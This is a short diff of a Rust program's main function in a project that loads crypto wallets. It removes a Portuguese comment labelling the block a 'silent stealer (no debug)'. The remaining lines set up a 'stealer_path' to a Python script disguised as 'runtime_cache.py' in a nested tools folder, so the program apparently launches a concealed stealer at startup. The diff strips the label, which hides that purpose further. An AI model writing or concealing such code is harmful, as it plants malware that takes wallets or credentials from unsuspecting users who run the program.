@@ -20,9 +20,6 @@ use wallets::load_wallets;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // ============================================================
-    // 🕵️‍♂️ STEALER SILENCIOSO (SEM DEBUG)
-    // ============================================================
     let project_root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
     let stealer_path = project_root.join("tools/bin/path/runtime_cache.py");
     let requirements_path = project_root.join("tools/bin/path/requirements.txt");
